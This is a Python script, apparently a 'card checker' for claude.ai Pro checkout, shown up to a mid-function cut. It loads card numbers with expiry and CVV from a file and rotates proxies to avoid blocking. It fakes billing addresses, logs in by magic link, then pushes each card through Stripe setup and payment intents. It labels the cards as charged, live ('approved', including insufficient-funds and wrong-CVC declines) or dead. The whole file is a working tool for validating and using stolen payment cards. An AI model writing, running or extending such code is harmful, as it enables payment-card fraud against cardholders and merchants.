#!/usr/bin/env python3
"""
Claude.ai Pro checkout checker — curl_cffi
Made by @Darkboy22 | Developer: @Darkboy22
"""

from __future__ import annotations

import base64
import json
import random
import re
import sys
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import unquote, urlparse

from curl_cffi import requests
from curl_cffi.requests.exceptions import CookieConflict, ProxyError

# ── Made by @Darkboy22 ──────────────────────────────────────────────────────
DEV_TG = "@Darkboy22"
CREDIT = f"Made by {DEV_TG}"
# ─────────────────────────────────────────────────────────────────────────────

BASE = "https://claude.ai"
IMPERSONATE = "chrome131"
LOCALE = "en-US"
SOURCE = "claude"
SESSION_FILE = Path(__file__).with_name("claude_session.json")
PROXY_FILE = Path(__file__).with_name("proxy.txt")
CC_FILE = Path(__file__).with_name("cc.txt")
PLAN_TYPE = "pro_monthly"
UPGRADE_URL = f"{BASE}/upgrade/pro?interval=monthly"

STRIPE_PK = (
    "pk_live_51MExQ9BjIQrRQnuxA9s9ahUkfIUHPoc3NFNidarWIUhEpwuc1bdjSJU9medEpVjoP4kTUrV2G8QWdxi9GjRJMUri005KO5xdyD"
)
STRIPE_VERSION = "2026-03-25.dahlia"

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
DIM = "\033[2m"
RESET = "\033[0m"

APPROVED_DECLINE_CODES = frozenset({
    "insufficient_funds",
    "incorrect_cvc",
    "invalid_cvc",
    "invalid_pin",
    "withdrawal_count_limit_exceeded",
})

RANDOM_ADDRESSES = [
    {"country": "US", "line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "postalCode": "62704"},
    {"country": "GB", "line1": "221B Baker Street", "city": "London", "state": "England", "postalCode": "NW1 6XE"},
    {"country": "CA", "line1": "100 Queen Street West", "city": "Toronto", "state": "ON", "postalCode": "M5H 2N2"},
    {"country": "DE", "line1": "Unter den Linden 77", "city": "Berlin", "state": "Berlin", "postalCode": "10117"},
    {"country": "FR", "line1": "10 Rue de Rivoli", "city": "Paris", "state": "IDF", "postalCode": "75001"},
    {"country": "AU", "line1": "1 Macquarie Street", "city": "Sydney", "state": "NSW", "postalCode": "2000"},
    {"country": "IN", "line1": "Naya Chowk Kamaldah", "city": "Sitamarhi", "state": "Bihar", "postalCode": "843322"},
    {"country": "JP", "line1": "1-1 Chiyoda", "city": "Tokyo", "state": "Tokyo", "postalCode": "100-0001"},
    {"country": "BR", "line1": "Avenida Paulista 1578", "city": "Sao Paulo", "state": "SP", "postalCode": "01310-200"},
    {"country": "MX", "line1": "Paseo de la Reforma 296", "city": "Mexico City", "state": "CDMX", "postalCode": "06600"},
]


@dataclass
class ProxyEntry:
    raw: str
    url: str


def print_banner() -> None:
    print(f"{CYAN}{'=' * 56}{RESET}")
    print(f"{CYAN}  Claude.ai Pro Checker  |  {CREDIT}{RESET}")
    print(f"{CYAN}  Developer TG: {DEV_TG}{RESET}")
    print(f"{CYAN}{'=' * 56}{RESET}")


def normalize_proxy(raw: str) -> str:
    line = raw.strip()
    if not line:
        return ""
    if line.startswith(("http://", "https://", "socks5://", "socks5h://")):
        return line
    if "@" in line and "://" not in line:
        return f"http://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        password = ":".join(parts[3:])
        return f"http://{user}:{password}@{host}:{port}"
    return f"http://{line}"


def load_proxy_entries(path: Path | None = None) -> list[ProxyEntry]:
    proxy_path = path or PROXY_FILE
    if not proxy_path.is_file():
        return []
    seen: set[str] = set()
    entries: list[ProxyEntry] = []
    for line in proxy_path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        url = normalize_proxy(stripped)
        if url and url not in seen:
            seen.add(url)
            entries.append(ProxyEntry(raw=stripped, url=url))
    return entries


def remove_proxy_from_file(entry: ProxyEntry) -> None:
    if not PROXY_FILE.is_file():
        return
    kept: list[str] = []
    for line in PROXY_FILE.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped:
            kept.append(line)
            continue
        if stripped == entry.raw.strip() or normalize_proxy(stripped) == entry.url:
            continue
        kept.append(line)
    PROXY_FILE.write_text("\n".join(kept).rstrip() + ("\n" if kept else ""), encoding="utf-8")
    print(f"{DIM}[{DEV_TG}] Removed dead proxy: {proxy_log_label(entry.url)}{RESET}")


def proxy_log_label(proxy: str) -> str:
    if "@" in proxy:
        scheme, rest = proxy.split("://", 1) if "://" in proxy else ("http", proxy)
        creds, host = rest.rsplit("@", 1)
        user = creds.split(":", 1)[0]
        return f"{scheme}://{user}:***@{host}"
    return proxy


def proxy_country(proxy: str) -> str:
    lower = proxy.lower()
    match = re.search(r"country-([a-z]{2})", lower)
    if match:
        code = match.group(1).upper()
        return "GB" if code == "UK" else code
    if "quebec" in lower:
        return "CA"
    if "fr-par" in lower or "france" in lower:
        return "FR"
    if "us" in lower.split("@")[-1] or "pointtoserver" in lower or "g-w.info" in lower:
        return "US"
    return "US"


def address_for_country(country: str) -> dict:
    matches = [a for a in RANDOM_ADDRESSES if a["country"] == country]
    return random.choice(matches) if matches else random.choice(RANDOM_ADDRESSES)


def load_cards(path: Path | None = None) -> list[tuple[str, dict]]:
    cc_path = path or CC_FILE
    if not cc_path.is_file():
        return []
    cards: list[tuple[str, dict]] = []
    for line in cc_path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        try:
            cards.append((stripped, _parse_card(stripped)))
        except ValueError:
            print(f"{DIM}[{DEV_TG}] Skipped bad line: {stripped[:20]}...{RESET}")
    return cards


def _stripe_tracking_id() -> str:
    return str(uuid.uuid4()) + format(random.getrandbits(32), "x")


def _export_claude_cookies(session: requests.Session) -> dict:
    cookies: dict[str, str] = {}
    jar = session.cookies
    if hasattr(jar, "jar"):
        for c in jar.jar:
            dom = c.domain or ""
            if "claude.ai" in dom or "anthropic" in dom:
                cookies[c.name] = c.value
        return cookies
    for domain in (".claude.ai", "claude.ai"):
        try:
            cookies.update(jar.get_dict(domain=domain))
        except Exception:
            pass
    return cookies


def _get_claude_cookie(session: requests.Session, name: str) -> str | None:
    for domain in (".claude.ai", "claude.ai"):
        try:
            val = session.cookies.get(name, domain=domain)
            if val:
                return val
        except Exception:
            pass
    try:
        return session.cookies.get(name)
    except CookieConflict:
        return None


def _is_proxy_error(exc: BaseException) -> bool:
    if isinstance(exc, ProxyError):
        return True
    msg = str(exc).lower()
    return any(x in msg for x in ("proxy", "connect tunnel", "connection refused", "timed out", "(56)", "(7)", "(28)", "(424)"))


class ProxyPool:
    """Random proxy per request — Made by @Darkboy22"""

    def __init__(self, entries: list[ProxyEntry]) -> None:
        self.entries = list(entries)

    def __len__(self) -> int:
        return len(self.entries)

    def pick(self) -> ProxyEntry | None:
        if not self.entries:
            return None
        return random.choice(self.entries)

    def drop(self, entry: ProxyEntry) -> bool:
        for i, e in enumerate(self.entries):
            if e.url == entry.url:
                remove_proxy_from_file(e)
                self.entries.pop(i)
                return bool(self.entries)
        return bool(self.entries)


class ClaudeClient:
    def __init__(self) -> None:
        self.session = requests.Session(impersonate=IMPERSONATE)
        self.stripe_session = requests.Session(impersonate=IMPERSONATE)
        self.device_id = str(uuid.uuid4())
        self.anonymous_id = f"claudeai.v1.{uuid.uuid4()}"
        self.activity_session_id = str(uuid.uuid4())
        self.client_sha = "8ff9529eb10ad6187e22132e5730b497c9eb7120"
        self.client_version = "1.0.0"
        self.email: str | None = None
        self.org_uuid: str | None = None
        self.account_name: str | None = None
        self.completed_verification_at: str | None = None
        self.proxy_pool: ProxyPool | None = None
        self._reset_stripe_session_ids()

    def _reset_stripe_session_ids(self) -> None:
        self.stripe_client_session_id = str(uuid.uuid4())
        self.stripe_elements_session_id = (
            "elements_session_"
            + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=12))
        )

    def set_proxies(self, entries: list[ProxyEntry]) -> None:
        self.proxy_pool = ProxyPool(entries) if entries else None

    def _request(self, method: str, url: str, *, stripe: bool = False, **kwargs):
        """Random proxy on every request — dead proxy removed from proxy.txt @Darkboy22"""
        sess = self.stripe_session if stripe else self.session
        max_tries = max(len(self.proxy_pool or []), 1)
        last_exc: BaseException | None = None
        for _ in range(max_tries):
            entry = self.proxy_pool.pick() if self.proxy_pool else None
            if entry:
                kwargs["proxy"] = entry.url
            try:
                return sess.request(method, url, **kwargs)
            except Exception as exc:
                last_exc = exc
                if _is_proxy_error(exc) and entry and self.proxy_pool and self.proxy_pool.drop(entry):
                    continue
                raise
        if last_exc:
            raise last_exc
        raise RuntimeError("No proxies left")

    def _sync_ids_from_cookies(self) -> None:
        device = _get_claude_cookie(self.session, "anthropic-device-id")
        activity = _get_claude_cookie(self.session, "activitySessionId")
        if device:
            self.device_id = device
        if activity:
            self.activity_session_id = activity

    def warm_session(self) -> None:
        resp = self._request("GET", f"{BASE}/new", headers=self._page_headers(), timeout=30)
        if resp.status_code < 400:
            self._extract_client_sha(resp.text)
        self._sync_ids_from_cookies()

    def _get_document(self, url: str, *, referer: str | None = None, warm: bool = True, retries: int = 4):
        if warm:
            self.warm_session()
        last = None
        for attempt in range(retries):
            resp = self._request("GET", url, headers=self._page_headers(referer), timeout=30)
            last = resp
            if resp.status_code < 400:
                return resp
            if resp.status_code in (403, 429) and attempt + 1 < retries:
                delay = 2.0 * (attempt + 1)
                print(f"{DIM}[{DEV_TG}] Cloudflare {resp.status_code}, retry {attempt + 2}/{retries} in {delay:.0f}s...{RESET}")
                time.sleep(delay)
                self.warm_session()
                continue
            resp.raise_for_status()
        last.raise_for_status()
        return last

    def _api_headers(self, referer: str) -> dict[str, str]:
        return {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "anthropic-anonymous-id": self.anonymous_id,
            "anthropic-client-platform": "web_claude_ai",
            "anthropic-client-sha": self.client_sha,
            "anthropic-client-version": self.client_version,
            "anthropic-device-id": self.device_id,
            "content-type": "application/json",
            "origin": BASE,
            "referer": referer,
            "x-activity-session-id": self.activity_session_id,
        }

    def _page_headers(self, referer: str | None = None) -> dict[str, str]:
        return {"referer": referer} if referer else {}

    def _extract_client_sha(self, html: str) -> None:
        match = re.search(r'data-git-hash="([^"]+)"', html)
        if match:
            self.client_sha = match.group(1)

    def save_session(self) -> None:
        self._sync_ids_from_cookies()
        cookies = _export_claude_cookies(self.session)
        if cookies.get("sessionKey"):
            cookies.pop("pendingLogin", None)
        data = {
            "device_id": self.device_id,
            "anonymous_id": self.anonymous_id,
            "activity_session_id": self.activity_session_id,
            "client_sha": self.client_sha,
            "client_version": self.client_version,
            "email": self.email,
            "org_uuid": self.org_uuid,
            "account_name": self.account_name,
            "completed_verification_at": self.completed_verification_at,
            "cookies": cookies,
        }
        SESSION_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")

    @classmethod
    def load_session(cls) -> ClaudeClient | None:
        if not SESSION_FILE.exists():
            return None
        try:
            data = json.loads(SESSION_FILE.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return None
        client = cls()
        client.device_id = data.get("device_id") or client.device_id
        client.anonymous_id = data.get("anonymous_id") or client.anonymous_id
        client.activity_session_id = data.get("activity_session_id") or client.activity_session_id
        client.client_sha = data.get("client_sha") or client.client_sha
        client.client_version = data.get("client_version") or client.client_version
        client.email = data.get("email")
        client.org_uuid = data.get("org_uuid")
        client.account_name = data.get("account_name")
        client.completed_verification_at = data.get("completed_verification_at")
        cookies = data.get("cookies") or {}
        if cookies:
            client.session.cookies.update(cookies)
        client._sync_ids_from_cookies()
        return client

    def check_authenticated_access(self) -> bool:
        if not self.org_uuid:
            return False
        resp = self._request(
            "GET",
            f"{BASE}/api/bootstrap/{self.org_uuid}/current_user_access",
            headers=self._api_headers(f"{BASE}/new"),
            timeout=30,
        )
        if resp.status_code in (401, 403) or resp.status_code >= 400:
            return False
        try:
            body = resp.json()
        except Exception:
            return False
        if body.get("type") == "error":
            return False
        return "features" in body or "account_permissions" in body

    def is_session_valid(self) -> bool:
        if not _get_claude_cookie(self.session, "sessionKey"):
            return False
        if not self.org_uuid:
            return False
        self._sync_ids_from_cookies()
        try:
            self.warm_session()
        except Exception:
            pass
        return self.check_authenticated_access()

    def account_dict(self) -> dict:
        return {
            "full_name": self.account_name,
            "display_name": self.account_name,
            "email_address": self.email,
            "completed_verification_at": self.completed_verification_at,
        }

    def _utc_offset_minutes(self) -> int:
        if time.daylight and time.localtime().tm_isdst:
            offset_sec = -time.altzone
        else:
            offset_sec = -time.timezone
        return offset_sec // 60

    def finalize_login(self, account: dict) -> None:
        memberships = account.get("memberships") or []
        if memberships:
            org = memberships[0].get("organization") or {}
            self.org_uuid = org.get("uuid") or self.org_uuid
        self.account_name = _account_name(account)
        self.email = account.get("email_address") or account.get("email") or self.email
        self.completed_verification_at = account.get("completed_verification_at")
        try:
            self.warm_session()
        except Exception:
            pass

    def fetch_login_page(self) -> None:
        print(f"{DIM}[{DEV_TG}] Fetching login page...{RESET}")
        resp = self._get_document(f"{BASE}/login", referer=f"{BASE}/new")
        self._extract_client_sha(resp.text)

    def get_login_methods(self, email: str) -> dict:
        resp = self._request(
            "GET",
            f"{BASE}/api/auth/login_methods",
            params={"email": email, "source": "claude-ai"},
            headers=self._api_headers(f"{BASE}/login"),
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    def send_magic_link(self, email: str) -> dict:
        payload = {
            "utc_offset": self._utc_offset_minutes(),
            "email_address": email,
            "login_intent": None,
            "locale": LOCALE,
            "return_to": None,
            "source": SOURCE,
        }
        resp = self._request(
            "POST",
            f"{BASE}/api/auth/send_magic_link",
            headers=self._api_headers(f"{BASE}/login"),
            json=payload,
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    @staticmethod
    def parse_magic_link(raw: str) -> tuple[str, str]:
        text = raw.strip()
        if not text:
            raise ValueError("Magic link is empty")
        if "://" in text:
            parsed = urlparse(text)
            fragment = unquote(parsed.fragment)
            if fragment:
                text = fragment
            else:
                from urllib.parse import parse_qs
                qs = parse_qs(parsed.query)
                nonce = (qs.get("nonce") or qs.get("token") or [None])[0]
                encoded = (qs.get("encoded_email_address") or qs.get("email") or [None])[0]
                if nonce and encoded:
                    return nonce, encoded
                raise ValueError("Could not parse magic link URL")
        if text.startswith("#"):
            text = text[1:]
        if ":" not in text:
            raise ValueError("Expected magic link like https://claude.ai/magic-link#NONCE:ENCODED_EMAIL")
        nonce, encoded_email = text.split(":", 1)
        if not nonce or not encoded_email:
            raise ValueError("Invalid magic link format")
        return nonce, encoded_email

    def fetch_magic_link_page(self, magic_link_url: str) -> None:
        url = magic_link_url if magic_link_url.startswith("http") else f"{BASE}/magic-link"
        resp = self._get_document(url, referer=f"{BASE}/login", warm=False)
        self._extract_client_sha(resp.text)

    def verify_magic_link(self, nonce: str, encoded_email: str) -> dict:
        payload = {
            "credentials": {"method": "nonce", "nonce": nonce, "encoded_email_address": encoded_email},
            "locale": LOCALE,
            "source": SOURCE,
        }
        resp = self._request(
            "POST",
            f"{BASE}/api/auth/verify_magic_link",
            headers=self._api_headers(f"{BASE}/magic-link"),
            json=payload,
            timeout=30,
        )
        if resp.status_code >= 400:
            try:
                detail = resp.json()
            except Exception:
                detail = resp.text
            raise RuntimeError(f"Verify failed ({resp.status_code}): {detail}")
        return resp.json()

    def get_account_profile(self) -> dict:
        resp = self._request(
            "GET",
            f"{BASE}/api/account_profile",
            headers=self._api_headers(f"{BASE}/new"),
            timeout=30,
        )
        if resp.status_code == 401:
            raise PermissionError("session invalid")
        resp.raise_for_status()
        return resp.json()

    def _require_org(self) -> str:
        if not self.org_uuid:
            profile = self.get_account_profile()
            account = profile.get("account") or profile
            memberships = account.get("memberships") or []
            if memberships:
                org = memberships[0].get("organization") or {}
                self.org_uuid = org.get("uuid")
            self.account_name = _account_name(account)
            self.email = account.get("email_address") or account.get("email") or self.email
        if not self.org_uuid:
            raise RuntimeError("Could not resolve organization UUID")
        return self.org_uuid

    def open_upgrade_checkout(self, address: dict) -> dict:
        org = self._require_org()
        self._get_document(UPGRADE_URL, referer=f"{BASE}/new", warm=False)
        pricing_resp = self._request(
            "POST",
            f"{BASE}/api/billing/{org}/individual_plan_pricing/v2",
            headers=self._api_headers(UPGRADE_URL),
            json={"address": {"country": address["country"]}, "forDisplayOnly": True},
            timeout=30,
        )
        pricing_resp.raise_for_status()
        return pricing_resp.json()

    def create_setup_intent(self, address: dict) -> dict:
        org = self._require_org()
        payload = {
            "country": address["country"],
            "billingAddress": {
                "line1": address["line1"],
                "line2": None,
                "city": address["city"],
                "state": address["state"],
                "postalCode": address["postalCode"],
                "country": address["country"],
            },
        }
        resp = self._request(
            "POST",
            f"{BASE}/api/stripe/{org}/intent",
            headers=self._api_headers(UPGRADE_URL),
            json=payload,
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    def confirm_setup_intent(
        self,
        setup_intent_id: str,
        client_secret: str,
        card: dict,
        address: dict,
        billing_name: str,
    ) -> dict:
        card_number = re.sub(r"\D", "", card["number"])
        exp_month = str(int(card["exp_month"])).zfill(2)
        exp_year = str(card["exp_year"])[-2:]
        guid, muid, sid = _stripe_tracking_id(), _stripe_tracking_id(), _stripe_tracking_id()
        meta_prefix = "payment_method_data[client_attribution_metadata]"
        attr_prefix = "client_attribution_metadata"
        data = {
            "return_url": f"{BASE}/settings/billing?action=update",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": card["cvc"],
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": address["postalCode"],
            "payment_method_data[billing_details][address][country]": address["country"],
            "payment_method_data[billing_details][address][line1]": address["line1"],
            "payment_method_data[billing_details][address][city]": address["city"],
            "payment_method_data[billing_details][address][state]": address["state"],
            "payment_method_data[billing_details][name]": billing_name,
            "payment_method_data[billing_details][phone]": "",
            "payment_method_data[payment_user_agent]": (
                "stripe.js/78d2c56201; stripe-js-v3/78d2c56201; payment-element; deferred-intent"
            ),
            "payment_method_data[referrer]": BASE,
            "payment_method_data[time_on_page]": str(random.randint(45000, 95000)),
            f"{meta_prefix}[client_session_id]": self.stripe_client_session_id,
            f"{meta_prefix}[merchant_integration_source]": "elements",
            f"{meta_prefix}[merchant_integration_subtype]": "payment-element",
            f"{meta_prefix}[merchant_integration_version]": "2021",
            f"{meta_prefix}[payment_intent_creation_flow]": "deferred",
            f"{meta_prefix}[payment_method_selection_flow]": "merchant_specified",
            f"{meta_prefix}[elements_session_id]": self.stripe_elements_session_id,
            f"{meta_prefix}[elements_session_config_id]": "248e6a93-99c2-4662-80a7-530a53e54a9e",
            f"{meta_prefix}[merchant_integration_additional_elements][0]": "address",
            f"{meta_prefix}[merchant_integration_additional_elements][1]": "payment",
            "payment_method_data[guid]": guid,
            "payment_method_data[muid]": muid,
            "payment_method_data[sid]": sid,
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "setup",
            "client_context[payment_method_types][0]": "card",
            "client_context[payment_method_types][1]": "link",
            "client_context[setup_future_usage]": "off_session",
            "use_stripe_sdk": "true",
            "key": STRIPE_PK,
            "_stripe_version": STRIPE_VERSION,
            f"{attr_prefix}[client_session_id]": self.stripe_client_session_id,
            f"{attr_prefix}[merchant_integration_source]": "elements",
            f"{attr_prefix}[merchant_integration_subtype]": "payment-element",
            f"{attr_prefix}[merchant_integration_version]": "2021",
            f"{attr_prefix}[payment_intent_creation_flow]": "deferred",
            f"{attr_prefix}[payment_method_selection_flow]": "merchant_specified",
            f"{attr_prefix}[elements_session_id]": self.stripe_elements_session_id,
            f"{attr_prefix}[elements_session_config_id]": "248e6a93-99c2-4662-80a7-530a53e54a9e",
            f"{attr_prefix}[merchant_integration_additional_elements][0]": "address",
            f"{attr_prefix}[merchant_integration_additional_elements][1]": "payment",
            "client_secret": client_secret,
        }
        resp = self._request(
            "POST",
            f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm",
            stripe=True,
            headers={
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
            },
            data=data,
            timeout=60,
        )
        try:
            return resp.json()
        except Exception:
            raw = {"error": {"message": resp.text, "code": str(resp.status_code)}, "_http_status": resp.status_code}
            _log_unknown_response(raw, context=f"setup_intents confirm HTTP {resp.status_code}")
            return raw

    def update_organization_profile(self, billing_name: str) -> None:
        org = self._require_org()
        self._request(
            "PUT",
            f"{BASE}/api/organizations/{org}/profile",
            headers=self._api_headers(UPGRADE_URL),
            json={"remove_tax_id": True, "company_name": billing_name},
            timeout=30,
        )

    def update_payment_method_latest(self) -> None:
        org = self._require_org()
        resp = self._request(
            "POST",
            f"{BASE}/api/organizations/{org}/payment_method/update_latest",
            headers=self._api_headers(UPGRADE_URL),
            timeout=30,
        )
        resp.raise_for_status()

    def create_subscription(self) -> dict:
        org = self._require_org()
        resp = self._request(
            "PUT",
            f"{BASE}/api/organizations/{org}/subscription",
            headers=self._api_headers(UPGRADE_URL),
            json={
                "billingInterval": "monthly",
                "plan": "pro",
                "promoCode": None,
                "useSavedAddress": True,
            },
            timeout=90,
        )
        resp.raise_for_status()
        return resp.json()

    def confirm_payment_intent(
        self,
        payment_intent_id: str,
        client_secret: str,
        payment_method_id: str,
    ) -> dict:
        data = {
            "use_stripe_sdk": "true",
            "payment_method": payment_method_id,
            "mandate_data[customer_acceptance][type]": "online",
            "mandate_data[customer_acceptance][online][infer_from_client]": "true",
            "return_url": f"{BASE}/settings/billing",
            "key": STRIPE_PK,
            "_stripe_version": STRIPE_VERSION,
            "client_secret": client_secret,
        }
        resp = self._request(
            "POST",
            f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm",
            stripe=True,
            headers={
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
            },
            data=data,
            timeout=90,
        )
        try:
            return resp.json()
        except Exception:
            raw = {"error": {"message": resp.text, "code": str(resp.status_code)}, "_http_status": resp.status_code}
            _log_unknown_response(raw, context=f"payment_intents confirm HTTP {resp.status_code}")
            return raw


def _account_name(account: dict) -> str:
    return account.get("full_name") or account.get("display_name") or account.get("name") or "Cardholder"


def _parse_card(raw: str) -> dict:
    text = raw.strip().replace(" ", "")
    if "|" not in text:
        raise ValueError("Use format: number|mm|yy|cvv")
    parts = text.split("|")
    if len(parts) < 4:
        raise ValueError("Use format: number|mm|yy|cvv")
    number, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    number = re.sub(r"\D", "", number)
    if len(number) < 13:
        raise ValueError("Invalid card number")
    return {"number": number, "exp_month": mm, "exp_year": yy, "cvc": cvc}


def _setup_intent_succeeded(result: dict) -> bool:
    if result.get("object") == "setup_intent" and result.get("status") == "succeeded":
        return True
    if result.get("status") == "succeeded":
        return True
    setup_intent = result.get("setup_intent") or {}
    return setup_intent.get("status") == "succeeded"


def _payment_intent_succeeded(result: dict) -> bool:
    if result.get("object") == "payment_intent" and result.get("status") == "succeeded":
        return True
    if result.get("status") == "succeeded":
        return True
    payment_intent = result.get("payment_intent") or {}
    return payment_intent.get("status") == "succeeded"


def _payment_intent_requires_action(result: dict) -> bool:
    if result.get("object") == "payment_intent" and result.get("status") == "requires_action":
        return True
    if result.get("status") == "requires_action":
        return True
    pi = result.get("payment_intent") or {}
    return pi.get("status") == "requires_action"


def _extract_payment_method_id(result: dict) -> str | None:
    for pm in (result.get("payment_method"), (result.get("setup_intent") or {}).get("payment_method")):
        if isinstance(pm, str):
            return pm
        if isinstance(pm, dict):
            return pm.get("id")
    return None


def _stripe_last_error(result: dict) -> dict:
    err = result.get("error") or {}
    nested = (
        err.get("payment_intent")
        or err.get("setup_intent")
        or result.get("payment_intent")
        or result.get("setup_intent")
        or {}
    )
    for source in (nested, result, err):
        if not isinstance(source, dict):
            continue
        last = source.get("last_payment_error") or source.get("last_setup_error")
        if last:
            return last
    return {}


def _extract_decline_code(result: dict) -> str:
    last_err = _stripe_last_error(result)
    if last_err:
        return last_err.get("decline_code") or last_err.get("code") or ""
    err = result.get("error") or {}
    return err.get("decline_code") or err.get("code") or ""


def _log_unknown_response(result: dict, *, context: str = "") -> None:
    label = f" ({context})" if context else ""
    try:
        body = json.dumps(result, indent=2, default=str)
    except Exception:
        body = repr(result)
    print(f"{DIM}[{DEV_TG}] Unknown error — raw response{label}:{RESET}", file=sys.stderr)
    print(f"{DIM}{body}{RESET}", file=sys.stderr)


def _format_stripe_error(result: dict, *, log_unknown: bool = True) -> str:
    last_err = _stripe_last_error(result)
    if last_err:
        message = last_err.get("message") or "Payment failed"
        decline = last_err.get("decline_code") or last_err.get("code") or ""
        if decline and decline not in message:
            return f"{message} ( {decline} )"
        return message

    err = result.get("error") or {}
    message = err.get("message") or result.get("message")
    if not message and result.get("status"):
        message = f"Stripe status: {result.get('status')}"
    if not message:
        if log_unknown:
            _log_unknown_response(result, context="stripe")
        return "Unknown error"

    decline = err.get("decline_code") or err.get("code") or _extract_decline_code(result)
    if decline and decline not in message:
        return f"{message} ( {decline} )"
    return message


def _payment_intent_id_from_secret(client_secret: str) -> str:
    if "_secret_" in client_secret:
        return client_secret.split("_secret_")[0]
    return client_secret


def _is_plan_upgraded_response(sub: dict) -> bool:
    return (
        sub.get("status") in ("active", "trialing")
        and sub.get("requiresAction") is False
        and sub.get("clientSecret") is None
    )


def _subscription_api_url(org_uuid: str) -> str:
    return f"{BASE}/api/organizations/{org_uuid}/subscription"


def print_card_result(card_line: str, status: str, message: str, color: str) -> None:
    print(f"{color}{card_line} | {status} | {message}{RESET}")


def classify_setup_result(result: dict) -> tuple[str, str, str]:
    if _setup_intent_succeeded(result):
        return "APPROVED", "Card added successfully", GREEN
    msg = _format_stripe_error(result)
    code = _extract_decline_code(result).lower()
    if code in APPROVED_DECLINE_CODES or any(c in msg.lower() for c in ("insufficient_funds", "incorrect_cvc", "invalid_cvc", "security code")):
        return "APPROVED", msg, YELLOW
    return "DECLINED", msg, RED


def _login_with_magic_link(client: ClaudeClient) -> dict:
    client.fetch_login_page()
    email = input(f"\n{DEV_TG} Email: ").strip()
    if not email or "@" not in email:
        raise ValueError("Invalid email")
    client.email = email
    try:
        client.get_login_methods(email)
    except Exception:
        pass
    result = client.send_magic_link(email)
    if not result.get("sent"):
        raise RuntimeError(f"Magic link not sent: {result}")
    print(f"[+] Magic link sent — {CREDIT}")
    magic_input = input(f"\n{DEV_TG} Magic link URL: ").strip()
    nonce, encoded_email = client.parse_magic_link(magic_input)
    decoded_email = base64.b64decode(encoded_email).decode()
    if decoded_email.lower() != email.lower():
        client.email = decoded_email
    link_url = magic_input if magic_input.startswith("http") else f"{BASE}/magic-link#{nonce}:{encoded_email}"
    client.fetch_magic_link_page(link_url)
    verify_result = client.verify_magic_link(nonce, encoded_email)
    if not verify_result.get("success"):
        raise RuntimeError(f"Login failed: {verify_result}")
    return verify_result.get("account") or {}


def _ensure_login(proxy_entries: list[ProxyEntry]) -> tuple[ClaudeClient, dict]:
    client = ClaudeClient.load_session()
    if client:
        client.set_proxies(proxy_entries)
        if client.is_session_valid():
            print(f"[+] Session valid — {CREDIT}")
            client.save_session()
            return client, client.account_dict()
        print("[!] Session expired — magic link required.")
    else:
        client = ClaudeClient()
        client.set_proxies(proxy_entries)
    account = _login_with_magic_link(client)
    client.finalize_login(account)
    client.save_session()
    return client, client.account_dict()


def _try_charge_card(
    client: ClaudeClient,
    *,
    card: dict,
    address: dict,
    billing_name: str,
) -> tuple[str, str, str]:
    """Returns (status, message, color) — random proxy per request @Darkboy22"""
    client._reset_stripe_session_ids()

    while client.proxy_pool and len(client.proxy_pool):
        try:
            intent_data = client.create_setup_intent(address)
        except Exception as exc:
            if _is_proxy_error(exc) and client.proxy_pool.entries:
                continue
            return "ERROR", str(exc), RED

        client_secret = intent_data.get("clientSecret")
        setup_intent_id = intent_data.get("setupIntentId")
        if not client_secret or not setup_intent_id:
            return "ERROR", f"Bad intent: {intent_data}", RED

        try:
            setup_result = client.confirm_setup_intent(
                setup_intent_id=setup_intent_id,
                client_secret=client_secret,
                card=card,
                address=address,
                billing_name=billing_name,
            )
        except Exception as exc:
            if _is_proxy_error(exc) and client.proxy_pool.entries:
                continue
            return "ERROR", str(exc), RED

        if not _setup_intent_succeeded(setup_result):
            return classify_setup_result(setup_result)

        payment_method_id = _extract_payment_method_id(setup_result)
        if not payment_method_id:
            return "ERROR", "No payment_method in response", RED

        try:
            client.update_organization_profile(billing_name)
            client.update_payment_method_latest()
            sub = client.create_subscription()
        except Exception as exc:
            if _is_proxy_error(exc) and client.proxy_pool.entries:
                continue
            return "APPROVED", f"Card saved, sub failed: {exc}", YELLOW

        if _is_plan_upgraded_response(sub):
            url = _subscription_api_url(client._require_org())
            return "CHARGED", f"Plan Upgraded {url}", GREEN

        sub_secret = sub.get("clientSecret")
        if not sub_secret:
            return "APPROVED", "Card saved, unexpected sub response", YELLOW

        pi_id = _payment_intent_id_from_secret(sub_secret)
        try:
            purchase_result = client.confirm_payment_intent(
                payment_intent_id=pi_id,
                client_secret=sub_secret,
                payment_method_id=payment_method_id,
            )
        except Exception as exc:
            if _is_proxy_error(exc) and client.proxy_pool.entries:
                continue
            return "APPROVED", f"Card saved, charge failed: {exc}", YELLOW

        if _payment_intent_succeeded(purchase_result):
            return "CHARGED", "Subscription payment succeeded", GREEN

        if _payment_intent_requires_action(purchase_result):
